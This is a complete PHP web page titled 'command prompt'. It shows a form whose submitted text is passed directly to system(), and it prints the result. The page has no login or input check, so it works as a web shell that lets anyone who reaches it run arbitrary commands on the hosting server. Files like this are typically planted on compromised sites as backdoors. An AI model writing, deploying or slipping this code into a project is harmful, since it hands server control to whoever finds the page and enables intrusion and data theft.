<!DOCTYPE html>
<html>
<head>
    <title>command prompt</title>
</head>
<body>
    <center>
    <br />
    <br />
    <br />
    <br />
    <br />
    <form method="post">
        <label for="command"></label>
        <input type="text" name="command" id="command" placeholder="command">
        <input type="submit" value="go">
    </form>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $command = $_POST['command'];
        $x = system($command);
        echo "<pre>$x</pre>";
    }
    ?>
    </center>
</body>
</html>